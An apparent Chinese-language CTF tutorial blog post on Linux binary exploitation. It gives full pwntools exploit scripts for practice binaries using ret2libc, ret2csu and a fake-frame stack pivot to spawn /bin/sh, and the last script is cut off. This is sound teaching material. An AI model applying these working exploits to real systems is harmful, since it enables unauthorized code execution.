<!DOCTYPE html>
<html lang="en">
<head><meta name="generator" content="Hexo 3.8.0">

    <!--[if lt IE 9]>
        <style>body {display: none; background: none !important} </style>
        <meta http-equiv="Refresh" Content="0; url=//outdatedbrowser.com/" />
    <![endif]-->

<meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
<meta name="format-detection" content="telephone=no">
<meta name="author" content="Gonglong Chen">



<meta name="description" content="前言Linux pwn系列继续更新。近期终于花了一点时间把自己的坑填上。今天将首先为大家带来上篇文章遗留题目的解答。再次，将介绍两种pwn的方式。这两种pwn都是针对开启了NX保护的程序。其间，还给大家分享了我更新的工具getOverFlowOffset。该工具经过升级，能够同时应对开启和没有开启PIE的程序。支持分析32位和64位程序。欢迎大家提issue :)。 “纸上得来终觉浅,绝知此事要">
<meta name="keywords" content="linux-pwn,fake frame,ret2csu">
<meta property="og:type" content="article">
<meta property="og:title" content="Linux pwn从入门到熟练（三）">
<meta property="og:url" content="http://yoursite.com/2019/10/29/linux-pwn-basic-3/index.html">
<meta property="og:site_name" content="Gonglong Chen">
<meta property="og:description" content="前言Linux pwn系列继续更新。近期终于花了一点时间把自己的坑填上。今天将首先为大家带来上篇文章遗留题目的解答。再次，将介绍两种pwn的方式。这两种pwn都是针对开启了NX保护的程序。其间，还给大家分享了我更新的工具getOverFlowOffset。该工具经过升级，能够同时应对开启和没有开启PIE的程序。支持分析32位和64位程序。欢迎大家提issue :)。 “纸上得来终觉浅,绝知此事要">
<meta property="og:locale" content="en">
<meta property="og:image" content="https://p1.ssl.qhimg.com/t01749be58aa4e9bc9d.gif">
<meta property="og:image" content="https://desword.github.io/image/2019-10-27/1.png">
<meta property="og:image" content="https://desword.github.io/image/2019-10-27/2.png">
<meta property="og:image" content="https://desword.github.io/image/2019-10-27/3.png">
<meta property="og:image" content="https://desword.github.io/image/2019-10-27/4.png">
<meta property="og:image" content="https://desword.github.io/image/2019-10-27/5.png">
<meta property="og:image" content="https://desword.github.io/image/2019-10-27/6.png">
<meta property="og:image" content="https://desword.github.io/image/2019-10-27/7.png">
<meta property="og:image" content="https://desword.github.io/image/2019-10-27/8.png">
<meta property="og:image" content="https://desword.github.io/image/2019-10-27/9.png">
<meta property="og:image" content="https://desword.github.io/image/2019-10-27/10.png">
<meta property="og:image" content="https://desword.github.io/image/2019-10-27/11.png">
<meta property="og:image" content="https://desword.github.io/image/2019-10-27/12.png">
<meta property="og:image" content="https://desword.github.io/image/2019-10-27/13.png">
<meta property="og:image" content="https://desword.github.io/image/2019-10-27/14.png">
<meta property="og:image" content="https://desword.github.io/image/2019-10-27/15.png">
<meta property="og:image" content="https://desword.github.io/image/2019-10-27/16.png">
<meta property="og:image" content="https://desword.github.io/image/2019-10-27/17.png">
<meta property="og:image" content="https://desword.github.io/image/2019-10-27/18.png">
<meta property="og:image" content="https://desword.github.io/image/2019-10-27/19.png">
<meta property="og:image" content="https://desword.github.io/image/2019-10-27/20.png">
<meta property="og:image" content="https://desword.github.io/image/2019-10-27/21.png">
<meta property="og:image" content="https://desword.github.io/image/2019-10-27/22.png">
<meta property="og:image" content="https://desword.github.io/image/2019-10-27/23.png">
<meta property="og:updated_time" content="2020-08-15T01:28:56.393Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="Linux pwn从入门到熟练（三）">
<meta name="twitter:description" content="前言Linux pwn系列继续更新。近期终于花了一点时间把自己的坑填上。今天将首先为大家带来上篇文章遗留题目的解答。再次，将介绍两种pwn的方式。这两种pwn都是针对开启了NX保护的程序。其间，还给大家分享了我更新的工具getOverFlowOffset。该工具经过升级，能够同时应对开启和没有开启PIE的程序。支持分析32位和64位程序。欢迎大家提issue :)。 “纸上得来终觉浅,绝知此事要">
<meta name="twitter:image" content="https://p1.ssl.qhimg.com/t01749be58aa4e9bc9d.gif">

<link rel="apple-touch-icon" href="/apple-touch-icon.png">


    <link rel="alternate" href="/atom.xml" title="Gonglong Chen" type="application/atom+xml">



    <link rel="shortcut icon" href="/favicon.png">





    <link href="//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.min.css" rel="stylesheet">



    <script src="//cdn.bootcss.com/pace/1.0.2/pace.min.js"></script>
    <link href="//cdn.bootcss.com/pace/1.0.2/themes/blue/pace-theme-minimal.css" rel="stylesheet">


<link rel="stylesheet" href="/css/style.css">





<link href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">


<title>Linux pwn从入门到熟练（三） | Gonglong Chen</title>

<script src="//cdn.bootcss.com/jquery/2.2.4/jquery.min.js"></script>
<script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>

<script>
    var yiliaConfig = {
        fancybox: true,
        animate: false,
        isHome: false,
        isPost: true,
        isArchive: false,
        isTag: false,
        isCategory: false,
        fancybox_js: "//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.min.js",
        scrollreveal: "//cdn.bootcss.com/scrollReveal.js/3.1.4/scrollreveal.min.js",
        search: true
    }
</script>


    <script> yiliaConfig.jquery_ui = [false]; </script>



    <script> yiliaConfig.rootUrl = "\/";</script>







  <!--prettify代码高亮主题css引入-->
  <link href="/plugins/prettify/themes/atelier-lakeside-dark.css" rel="stylesheet">



</head></html>
<body>
  <div id="container">
    <div class="left-col">
    <div class="overlay"></div>
<div class="intrude-less">
    <header id="header" class="inner">
        <a href="/" class="profilepic">
            <img src="/img/head.jpg" class="animated zoomIn">
        </a>
        <hgroup>
          <h1 class="header-author"><a href="/">Gonglong Chen</a></h1>
        </hgroup>

        

        
            <form id="search-form">
            <input type="text" id="local-search-input" name="q" placeholder="search..." class="search form-control" autocomplete="off" autocorrect="off" searchonload="">
            <i class="fa fa-times" onclick="resetSearch()"></i>
            </form>
            <div id="local-search-result"></div>
            <p class="no-result">No results found <i class="fa fa-spinner fa-pulse"></i></p>
        


        

        <div id="switch-area" class="switch-area">
            <div class="switch-wrap">
                <section class="switch-part switch-part1">
                    <nav class="header-menu">
                        <ul>
                        
                            <li><a href="/archives/">blogs</a></li>
                        
                            <li><a href="/tags/">Tages</a></li>
                        
                            <li><a href="/about/">Aboutme</a></li>
                        
                        </ul>
                    </nav>
                    <nav class="header-nav">
                        <ul class="social">
                            
                                <a class="fa 新浪微博" href="https://weibo.com/u/2618063075" title="新浪微博"></a>
                            
                                <a class="fa GitHub" href="https://github.com/desword" title="GitHub"></a>
                            
                                <a class="fa anquank" href="https://www.anquanke.com/member/122056" title="anquank"></a>
                            
                                <a class="fa CSDN" href="https://blog.csdn.net/ls1160" title="CSDN"></a>
                            
                        </ul>
                    </nav>
                </section>
                
                
                
                

                
            </div>
        </div>
    </header>                
</div>
    </div>
    <div class="mid-col">
      <nav id="mobile-nav">
      <div class="overlay">
          <div class="slider-trigger"></div>
          <h1 class="header-author js-mobile-header hide"><a href="/" title="回到主页">Gonglong Chen</a></h1>
      </div>
    <div class="intrude-less">
        <header id="header" class="inner">
            <a href="/" class="profilepic">
                <img src="/img/head.jpg" class="animated zoomIn">
            </a>
            <hgroup>
              <h1 class="header-author"><a href="/" title="回到主页">Gonglong Chen</a></h1>
            </hgroup>
            
            <nav class="header-menu">
                <ul>
                
                    <li><a href="/archives/">blogs</a></li>
                
                    <li><a href="/tags/">Tages</a></li>
                
                    <li><a href="/about/">Aboutme</a></li>
                
                <div class="clearfix"></div>
                </ul>
            </nav>
            <nav class="header-nav">
                        <ul class="social">
                            
                                <a class="fa 新浪微博" target="_blank" href="https://weibo.com/u/2618063075" title="新浪微博"></a>
                            
                                <a class="fa GitHub" target="_blank" href="https://github.com/desword" title="GitHub"></a>
                            
                                <a class="fa anquank" target="_blank" href="https://www.anquanke.com/member/122056" title="anquank"></a>
                            
                                <a class="fa CSDN" target="_blank" href="https://blog.csdn.net/ls1160" title="CSDN"></a>
                            
                        </ul>
            </nav>
        </header>                
    </div>
    <link class="menu-list" tags="Tags" friends="Friends" about="About Me">
</nav>
      <div class="body-wrap"><article id="post-linux-pwn-basic-3" class="article article-type-post" itemscope="" itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2019/10/29/linux-pwn-basic-3/" class="article-date">
      <time datetime="2019-10-29T06:17:11.000Z" itemprop="datePublished">2019-10-29</time>
</a>


    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy">
    
    
      <header class="article-header">
        
  
    <h1 class="article-title" itemprop="name">
      Linux pwn从入门到熟练（三）
    </h1>
  

      </header>
      
      <div class="article-info article-info-post">
        

        
    <div class="article-tag tagcloud">
        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/fake-frame/">fake frame</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/linux-pwn/">linux-pwn</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ret2csu/">ret2csu</a></li></ul>
    </div>

        <div class="clearfix"></div>
      </div>
      
    
    <div class="article-entry" itemprop="articleBody">
      
          
        <p><img src="https://p1.ssl.qhimg.com/t01749be58aa4e9bc9d.gif" alt=""></p>
<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>Linux pwn系列继续更新。近期终于花了一点时间把自己的坑填上。今天将首先为大家带来上篇文章遗留题目的解答。再次，将介绍两种pwn的方式。这两种pwn都是针对开启了NX保护的程序。其间，还给大家分享了我更新的工具<a href="https://github.com/desword/shellcode_tools" target="_blank" rel="noopener">getOverFlowOffset</a>。<br>该工具经过升级，能够同时应对开启和没有开启PIE的程序。支持分析32位和64位程序。欢迎大家提issue :)。</p>
<p>“纸上得来终觉浅,绝知此事要躬行”<br>——《冬夜读书示子聿》</p>
<p>时间久远，怕大家找不到从前的文章，特此给出传送门：<br><a href="https://bbs.pediy.com/thread-248681.htm" target="_blank" rel="noopener">Linux pwn从入门到熟练（二）</a><br><a href="https://bbs.pediy.com/thread-248682.htm" target="_blank" rel="noopener">Linux pwn从入门到熟练</a></p>
<a id="more"></a> 
<h1 id="练习题pwn7参考解答"><a href="#练习题pwn7参考解答" class="headerlink" title="练习题pwn7参考解答"></a>练习题pwn7参考解答</h1><p>前述<a href="https://bbs.pediy.com/thread-248681.htm" target="_blank" rel="noopener">Linux pwn从入门到熟练（二）</a>这篇文章留了一道习题pwn7给大家做。下面给出一种参考解答。</p>
<h2 id="查看保护"><a href="#查看保护" class="headerlink" title="查看保护"></a>查看保护</h2><p><img src="https://desword.github.io/image/2019-10-27/1.png" alt=""></p>
<p>可以发现。栈是不可以执行的。但是没有开启PIE/ALSR，即地址随机化。因此IDA查看的函数地址是可以直接使用的。</p>
<h2 id="判断漏洞函数"><a href="#判断漏洞函数" class="headerlink" title="判断漏洞函数"></a>判断漏洞函数</h2><p><img src="https://desword.github.io/image/2019-10-27/2.png" alt=""></p>
<p>可以发现，函数gets存在栈溢出漏洞。</p>
<h2 id="获取溢出点距离EBP的偏移距离"><a href="#获取溢出点距离EBP的偏移距离" class="headerlink" title="获取溢出点距离EBP的偏移距离"></a>获取溢出点距离EBP的偏移距离</h2><p>这里，我推荐一个自己写的工具<a href="https://github.com/desword/shellcode_tools" target="_blank" rel="noopener">getOverFlowOffset</a>。<br>该工具经过我的升级，能够同时应对开启和没有开启PIE的程序。<br>它会自己检测程序是否开启了PIE，对于开启了PIE的程序，它会通过程序里面调用的其他库函数泄露正确的地址，并将存在漏洞的返回地址修正。比如：</p>
<pre><code>$ python getOverFlowOffset.py 0x00000632 example_bin/pwn200_PIE
[*] example_bin/pwn200_PIE is 32 bits
[*] PIE is enabled
[*] Found a leak function: write
[*] Found the leaked address 0x565556c2, we can leave
[*] The real vul_ret_address is:0x56555632
[+] Found offset to the EBP is 108.
[+] THe offset to the RET_ADDR is 112 (32bits) or 116 (64bits).
</code></pre><p>在本程序中，没有开启PIE，因此有如下的结果：</p>
<pre><code>$ python getOverFlowOffset.py 0x08048695 ~/pwn_execrise/pwn_basic_rop_2/pwn7
[*] /home/desword/pwn_execrise/pwn_basic_rop_2/pwn7 is 32 bits
[*] no PIE
[+] Found offset to the EBP is 108.
[+] THe offset to the RET_ADDR is 112 (32bits) or 116 (64bits).
</code></pre><p>可以发现，溢出点距离EBP的距离是108字节。该程序是32位程序，因此距离存储了返回地址的距离是112字节。</p>
<h2 id="分析是否载入了系统函数"><a href="#分析是否载入了系统函数" class="headerlink" title="分析是否载入了系统函数"></a>分析是否载入了系统函数</h2><p><img src="https://desword.github.io/image/2019-10-27/3.png" alt=""></p>
<p>从该程序的提示和查看导入函数表我们可以发现，并没有可以直接用于获取shell的系统函数了（如：system, execve）。我们会马上想到<a href="https://bbs.pediy.com/thread-248681.htm" target="_blank" rel="noopener">上一篇文章</a>提到的写shellcodes, 构造syscall的方法。但是，我们前面查保护的时候又发现，该程序开启了栈不可执行保护（NX）。因此也是不可能构造shellcode 了。我们需要自己主动的从系统库libc中提取用于获取shell的库函数。</p>
<p>那么我们怎么提取用于获取shell的库函数呢？<br>libc动态库载入时，其内库函数地址的构成：</p>
<pre><code>库函数f载入地址：f@load = libc@load + f_offset@libc
即库函数f载入地址由libc动态库载入时的基地址+库函数在libc动态库中的偏移。
</code></pre><p>包括两个主要步骤，</p>
<ol>
<li>获取动态链接库libc被pwn7程序载入时的基地址libc_base；  </li>
<li>将目标库函数的地址更新位pwn7程序载入的地址。  </li>
</ol>
<h2 id="获取libc基地址"><a href="#获取libc基地址" class="headerlink" title="获取libc基地址"></a>获取libc基地址</h2><p>那么如何获取libc的基地址呢？<br>我们从上述库函数f载入地址的构成就能够窥探出一丝技巧：如果我们泄露任意一个pwn7程序已经载入的属于libc动态库的函数地址f@load（比如__libc_start_main），然后在函数f在libc中的偏移f_offset@libc已知的情况下，就能够反推出libc载入的基地址libc@load了，即：</p>
<pre><code>libc@load  =  f@load - f_offset@libc
</code></pre><p>其中f_offset@libc对于一个确定的动态库libc是固定的，且可以静态的获得。<br>因此，pwn7漏洞利用的大致步骤为：</p>
<ol>
<li>溢出目标 中已经载入的函数的地址，比如__libc_start_main</li>
<li>搜索载入的libc的库，并且libc库中的函数相对偏移已经获得</li>
<li>计算libc的基地址，通过载入函数的地址__libc_start_main 减去libc中__libc_start_main的相对偏移</li>
<li>搜索libc中的system的偏移，</li>
<li>搜索libc中的/bin/sh字符串的偏移，</li>
<li>最终构造函数的利用</li>
</ol>
<p>这里，为了通过泄露的库函数地址，来获得libc的基地址，我们借助了一个工具：<br>需要借助的工具。<a href="https://github.com/lieanu/LibcSearcher" target="_blank" rel="noopener">LibcSearch</a></p>
<p>该工具的安装方法为</p>
<pre><code>git clone https://github.com/lieanu/LibcSearcher.git
cd LibcSearcher
python setup.py develop
</code></pre><p>一般的使用方法为</p>
<pre><code>obj = LibcSearcher(&quot;fgets&quot;, 0X7ff39014bd90)

libcbase = 0X7ff39014bd90 – obj.dump(&quot;fgets&quot;)
system_addr = libcbase + obj.dump(&quot;system&quot;)        #system 偏移
bin_sh_addr = libcbase + obj.dump(&quot;str_bin_sh&quot;)    #/bin/sh 偏移
libcmain_addr = libcbase + obj.dump(&quot;__libc_start_main_ret&quot;)  
</code></pre><h2 id="完整的exp"><a href="#完整的exp" class="headerlink" title="完整的exp"></a>完整的exp</h2><pre><code># coding=utf-8
#!/usr/bin/env python
from pwn import *
from LibcSearcher import LibcSearcher
sh = process(&#39;./pwn7&#39;)

pwn7 = ELF(&#39;./pwn7&#39;)

puts_plt = pwn7.plt[&#39;puts&#39;]
libc_start_main_got = pwn7.got[&#39;__libc_start_main&#39;] #  载入的libc_main函数的地址。
main = pwn7.symbols[&#39;main&#39;]

success(&quot;leak libc_start_main addr and return to main again&quot;)
payload = flat([&#39;A&#39; * 112, puts_plt, main, libc_start_main_got]) # 首先通过puts函数的执行，将libc_main的载入地址泄漏出来。
sh.sendlineafter(&#39;Can you find it !?&#39;, payload)

success(&quot;get the libc base, and get system@got&quot;)
libc_start_main_addr = u32(sh.recv()[0:4])
libc = LibcSearcher(&#39;__libc_start_main&#39;, libc_start_main_addr)   # 搜索系统中所载入的libc库，并且自动读取里面的所有导出函数的相对地址。
libcbase = libc_start_main_addr - libc.dump(&#39;__libc_start_main&#39;) # 载入的libc_main地址减去，libc_main在libc库中的偏移，就是libc的基地址。
system_addr = libcbase + libc.dump(&#39;system&#39;)   # 从而获得system的载入地址
binsh_addr = libcbase + libc.dump(&#39;str_bin_sh&#39;) # 从而获得 /bin/sh字符串的载入地址

payload = flat([&#39;A&#39; * 104, system_addr, 0xdeadbeef, binsh_addr]) 
sh.sendline(payload)

sh.interactive()
</code></pre><h2 id="exp的栈分布图解："><a href="#exp的栈分布图解：" class="headerlink" title="exp的栈分布图解："></a>exp的栈分布图解：</h2><p><strong>为了泄露__libc_start_main地址的栈空间分布变化</strong></p>
<pre><code>payload = flat([&#39;A&#39; * 112, puts_plt, main, libc_start_main_got]) # 首先通过puts函数的执行，将libc_main的载入地址泄漏出来。
</code></pre><p><img src="https://desword.github.io/image/2019-10-27/4.png" alt=""></p>
<p>上述图中的右侧图展示了对应栈空间里面数值表达的含义。</p>
<p><strong>为了获取shell时栈空间分布变化</strong></p>
<pre><code>payload = flat([&#39;A&#39; * 104, system_addr, 0xdeadbeef, binsh_addr]) 
</code></pre><p><img src="https://desword.github.io/image/2019-10-27/5.png" alt=""></p>
<p><img src="https://desword.github.io/image/2019-10-27/6.png" alt=""></p>
<p>注意，选择libc的版本时，选择32位的，即第1个选项。</p>
<h1 id="64位程序通用ROP的构建"><a href="#64位程序通用ROP的构建" class="headerlink" title="64位程序通用ROP的构建"></a>64位程序通用ROP的构建</h1><p>对于64位程序，有一个可以获取通用ROP的方案，该方案来自于论文：<br>[black asia 2018]return-to-csu: A New Method to Bypass 64-bit Linux ASLR<br><a href="https://github.com/desword/pwn_execrise/blob/master/pwn_basic_rop_3/asis18_ret2csu_wp.pdf" target="_blank" rel="noopener">Paper</a>,<a href="https://github.com/desword/pwn_execrise/blob/master/pwn_basic_rop_3/asia18_ret2csu.pdf" target="_blank" rel="noopener">Slides</a></p>
<p>在某些程序中，我们会发现可以用来构造ROP的 gadgets较少。因此可以利用上述通用ROP方案。由于，该方法的核心是利用函数__libc_csu_init中的代码，因此成为ret2csu。<br>构造ROP的核心步骤包括三点：<br>其一是获得用于获取shell的库函数地址，<br>其二是安排该库函数在合适的位置被调用，<br>其三是如何巧妙的向函数传参数。</p>
<p>主要思想是：在每个64位的linux程序中都有一段初始化的代码，该代码中含有一段可以被用来间接给函数输入参数赋值的代码。</p>
<p>该段通用代码位于__libc_csu_init函数中：</p>
<p><img src="https://desword.github.io/image/2019-10-27/7.png" alt=""></p>
<p>借用论文中的gadgets图来说明调用方式：</p>
<p><img src="https://desword.github.io/image/2019-10-27/8.png" alt=""></p>
<p>在64位的程序中，当参数少于7个时， 参数从左到右放入寄存器: rdi, rsi, rdx, rcx, r8, r9。<br>因此，对应于上述提到的三点核心的后面两点：<br><strong>其二是安排该库函数在合适的位置被调用</strong>：可以发现，在gadget 2中，可以利用callq来调用地址%r12+%rbx*8指向的函数。我们可以设置rbx=0，那么就变成%r12寄存器指向的函数。而%r12寄存器的值可以利用gadget 1中的代码从栈中指定位置获取。</p>
<p><strong>其三是如何巧妙的向函数传参数</strong>：从gadget 2中可以发现64位程序前三个输入参数存入的寄存器rdi, rsi, rdx分别可以从寄存器r15d, r14, r13中获取值。而结合gadget 1，可以发现r15d, r14, r13的值可以从栈中获取。那么通过合理的分配栈中的数据，我们就可以顺利的控制参数数值了。三个参数对于大部分的漏洞利用而言，基本够用了。</p>
<p>下面以一道zhengmin大神的level 5 , 64位程序来讲解。<br><a href="https://github.com/desword/pwn_execrise/blob/master/pwn_basic_rop_3/pwn8" target="_blank" rel="noopener">Pwn8</a><br>那么我们回到本题中，迅速的三连。</p>
<h2 id="快速三连：查保护，查漏洞，算偏移"><a href="#快速三连：查保护，查漏洞，算偏移" class="headerlink" title="快速三连：查保护，查漏洞，算偏移"></a>快速三连：查保护，查漏洞，算偏移</h2><p><img src="https://desword.github.io/image/2019-10-27/9.png" alt=""></p>
<p>开启了栈不可执行保护（NX）。没有开启PIE和canary。</p>
<p><img src="https://desword.github.io/image/2019-10-27/10.png" alt=""></p>
<p>溢出的原因是对于char类型变量，可以输入超长的长度。</p>
<pre><code>$ python getOverFlowOffset.py  0x0000000000400563 ~/pwn_execrise/pwn_basic_rop_3/pwn8
[*] /home/desword/pwn_execrise/pwn_basic_rop_3/pwn8 is 64 bits
[*] no PIE
[+] Found offset to the EBP is 128.
[+] THe offset to the RET_ADDR is 132 (32bits) or 136 (64bits)
</code></pre><p>距离EBP的偏移是128，距离返回地址的覆盖是136字节。</p>
<h2 id="分析利用方式"><a href="#分析利用方式" class="headerlink" title="分析利用方式"></a>分析利用方式</h2><p>值得注意的是，本题中的__libc_csu_init汇编结果不同，寄存器赋值的顺序也变了。但是只要利用的思路理解了，稍微调整一下即可。</p>
<p><img src="https://desword.github.io/image/2019-10-27/11.png" alt=""></p>
<h2 id="完整的EXP"><a href="#完整的EXP" class="headerlink" title="完整的EXP"></a>完整的EXP</h2><pre><code>from pwn import *
from LibcSearcher import *

#context.log_level = &#39;debug&#39;

pwn8 = ELF(&#39;./pwn8&#39;)
sh = process(&#39;./pwn8&#39;)

write_got = pwn8.got[&#39;write&#39;]
read_got = pwn8.got[&#39;read&#39;]
main_addr = pwn8.symbols[&#39;main&#39;]
bss_base = pwn8.bss()

csu_front_addr = 0x00000000004005F0 # gadget 2.
csu_end_addr = 0x0000000000400606 # gadget 1, 

fakeebp = &#39;b&#39; * 8

def csu(rbx, rbp, r12, r13, r14, r15, last):
    # pop rbx,rbp,r12,r13,r14,r15
    # rbx should be 0,
    # rbp should be 1,enable not to jump
    # r12 should be the function we want to call

    # in my case, is the following case.
    # rdi=edi=r13d
    # rsi=r14
    # rdx=r15

    payload = &#39;a&#39; * 128 + fakeebp # 128 offset to rbp, then 8 bytes to the ret_addr.

    ## put the address of the gadget 1
    payload += p64(csu_end_addr)
    payload += &#39;a&#39;* 8 ## suplement for the additional rsp addition. i.e., add rsp, 38h.

    payload += p64(rbx) + p64(rbp) + p64(r12) + p64(r13) + p64(r14) + p64(r15)
    ## then put the address of the gadget 2, to call function
    payload += p64(csu_front_addr)
    payload += &#39;a&#39; * 0x38 
    payload += p64(last)
    sh.send(payload)
    sleep(1)

#gdb.attach(sh)

sh.recvuntil(&#39;Hello, World\n&#39;)
## write(1,write_got,8)
csu(0, 1, write_got, 1, write_got, 8, main_addr)

# sh.recvuntil(&#39;Hello, World\n&#39;)
write_addr = u64(sh.recv(8))
print &quot;write_addr, &quot;, hex(write_addr), write_addr
libc = LibcSearcher(&#39;write&#39;, write_addr)
libc_base = write_addr - libc.dump(&#39;write&#39;)
execve_addr = libc_base + libc.dump(&#39;execve&#39;)
log.success(&#39;execve_addr &#39; + hex(execve_addr))

####--- orignal test.
## read(0,bss_base,16)
## read execve_addr and /bin/sh\x00
sh.recvuntil(&#39;Hello, World\n&#39;)
csu(0, 1, read_got, 0, bss_base, 16, main_addr)

sh.send(p64(execve_addr) + &#39;/bin/sh\x00&#39;)

sh.recvuntil(&#39;Hello, World\n&#39;)
## execve(bss_base+8)
csu(0, 1, bss_base, bss_base + 8, 0, 0, main_addr)

sh.interactive()
</code></pre><h2 id="每次调用csu时栈的分布和相关寄存器变化"><a href="#每次调用csu时栈的分布和相关寄存器变化" class="headerlink" title="每次调用csu时栈的分布和相关寄存器变化"></a>每次调用csu时栈的分布和相关寄存器变化</h2><p><strong>调用write_got泄露write_got地址的栈</strong> </p>
<pre><code>csu(0, 1, write_got, 1, write_got, 8, main_addr)
</code></pre><p><img src="https://desword.github.io/image/2019-10-27/12.png" alt=""></p>
<p>序号后面的寄存器内容表示，执行完对应指令后，寄存器的变化。<br>标记红色的为关键的模块。<br>包括如何将栈中的地址映射到不同的寄存器中；再到寄存器赋值到64位程序输入参数中；最后到利用callq调用程序；最后修正rsp的指针，来跳转到主函数位置。</p>
<p><strong>调用read_got将字符串/bin/sh加载到bss段中</strong></p>
<pre><code>csu(0, 1, read_got, 0, bss_base, 16, main_addr)
</code></pre><p>此处部分的栈布置和前述利用write@got泄露write@got差不多。只是callq调用的函数变成了read@got。输入的参数变成了0, bss_base, 16.表示向地址bss_base输入16个字节。</p>
<p><strong>调用execve执行获得shell</strong></p>
<pre><code>csu(0, 1, bss_base, bss_base + 8, 0, 0, main_addr)
</code></pre><p>此处的bss_base地址中已经存储了execve的地址。注意，由于callq 调用时，是取目标地址指向的地址来调用函数，因此需要借助bss_base来转储一下内容。即callq [bss_base]=callq execve_address。否则是不会成功的。</p>
<p><img src="https://desword.github.io/image/2019-10-27/13.png" alt=""></p>
<p>运行时注意选择64位的libc库。即第0个选项。</p>
<p>这里解释一下，为什么在放完gadget 2地址之后，要padding 0x38个数据。才能够放入返回地址。</p>
<pre><code>payload += &#39;a&#39; * 0x38 
</code></pre><p>这是因为在执行完callq之后，我们会使得程序往后执行，且不进行跳转。从而可以最终执行到0x400628位置的retn函数，调用到我们布置的main函数，重新开始执行漏洞。我们在csu中设置了rbx=0, rbp=1.从而在执行到0x4005fd的时候，rbx加1，和rbp相等，从而不会执行跳转。继续往后执行，在到达retn之前，0x400624执行了add rsp, 38h的操作，将栈接着抬高了0x38，所以我们需要padding 0x38的数据，才能够让pwn8程序成功获取我们布置的返回地址。</p>
<p><img src="https://desword.github.io/image/2019-10-27/14.png" alt=""></p>
<p>同时，也由上图也可以看出为什么在放置了csu_end_addr之后，不是直接放置rbx参数的地址。因为[rsp+38h_var_30]，可以发现该指令取参数是在当前的rsp基础上增加了8的。因此需要padding 8个‘a’。</p>
<h1 id="fake-frame应对有限的溢出空间"><a href="#fake-frame应对有限的溢出空间" class="headerlink" title="fake frame应对有限的溢出空间"></a>fake frame应对有限的溢出空间</h1><p>上述64位的ROP是不是看起来已经很完美了？大家是不是跃跃欲试的想要带着上面这把“屠龙霸刀”到处找64位程序来练练手？恩，怕是要“欲试未半而中道崩殂”了。</p>
<p>看官且瞅瞅我这道菜。<br><a href="https://github.com/desword/pwn_execrise/blob/master/pwn_basic_rop_3/pwn9" target="_blank" rel="noopener">pwn9</a></p>
<p>让我们继续快速三连</p>
<h2 id="快速三连：查保护，查漏洞，算偏移-1"><a href="#快速三连：查保护，查漏洞，算偏移-1" class="headerlink" title="快速三连：查保护，查漏洞，算偏移"></a>快速三连：查保护，查漏洞，算偏移</h2><p><img src="https://desword.github.io/image/2019-10-27/15.png" alt=""></p>
<p>仅仅开启了NX。</p>
<p><img src="https://desword.github.io/image/2019-10-27/16.png" alt=""></p>
<p>存在漏洞的是read函数。Buf仅仅申请了0x50个字节长度，然而read允许读取0x60个字节长度。</p>
<pre><code>$ python getOverFlowOffset.py 0x00000000004006BF ~/pwn_execrise/pwn_basic_rop_3/pwn9
[*] /home/desword/pwn_execrise/pwn_basic_rop_3/pwn9 is 64 bits
[*] no PIE
[+] Found offset to the EBP is 80.
[+] THe offset to the RET_ADDR is 84 (32bits) or 88 (64bits).
</code></pre><p>距离EBP的偏移是80个字节，返回地址是88个字节。</p>
<p><strong>发现</strong>：有没有发现奇怪的点。对！能够允许溢出的长度非常有限，仅仅16个字节，刚好两个寄存器的长度。那么也就仅仅够覆盖EBP和返回地址了。我们看看前面ret2csu的构造，在溢出之后，需要很多字节来部署寄存器rdi, rsi, rdx的值，还要处理调用完函数之后0x38个字节的padding。因此，ret2csu无法直接使用了。我们也可以就此总结，ret2csu虽然通用，但是需要有较大的溢出空间。</p>
<p>怎么办呢？</p>
<p>这里介绍一种fake frame的方式，可以在溢出空间有限的时候，实现ROP。<br>在介绍这个操作之前，先给大家介绍两个汇编指令：leave和ret。</p>
<p>Leave指令相当于</p>
<pre><code>mov rsp, rbp
pop rbp
</code></pre><p>Ret指令相当于：</p>
<pre><code>pop rip
</code></pre><h2 id="Fake-frame-基本思路"><a href="#Fake-frame-基本思路" class="headerlink" title="Fake frame 基本思路"></a>Fake frame 基本思路</h2><p><img src="https://desword.github.io/image/2019-10-27/17.png" alt=""></p>
<p>一般程序的结束都是leave;retn。如果我们溢出的返回地址同样还是leave;retn，会发生什么呢？我们把两个leave; retn分别转换成上述解释的操作，来一一解释流程。</p>
<p><img src="https://desword.github.io/image/2019-10-27/18.png" alt=""></p>
<p>序号表示，执行完对应指令的操作之后，寄存器的变化情况。<br>可以发现，在初始栈中原来放置ebp的位置布置成未来要跳转的新的函数块的起始地址，可以将当前的rsp引导过去。而在目标地址的起始位置开始安装如下规律布置内容，就可以连续的调用自己想要的函数，且输入的参数长度可以自定义。<br>即： fake_frame_i | 要执行的函数地址 | leave ret 地址 | 参数1 | 参数2 | …<br>其中步骤1~3是原始程序中的leave; ret；后续的4~6是新增加的gadget里面的leave; ret。</p>
<h2 id="完整的EXP-1"><a href="#完整的EXP-1" class="headerlink" title="完整的EXP"></a>完整的EXP</h2><p>基于上述总结的思路，我们就可以构造下面完整的EXP了。</p>
<pre><code>from pwn import *
from LibcSearcher import *

context.binary = &quot;./pwn9&quot;

def DEBUG(cmd):
    gdb.attach(io, cmd)

io = process(&quot;./pwn9&quot;)
elf = ELF(&quot;./pwn9&quot;)

# DEBUG(&quot;b *0x4006B9\nc&quot;)
io.sendafter(&quot;&gt;&quot;, &#39;a&#39; * 80)
stack = u64(io.recvuntil(&quot;\x7f&quot;)[-6: ].ljust(8, &#39;\0&#39;)) - 0x70
success(&quot;stack -&gt; {:#x}&quot;.format(stack))

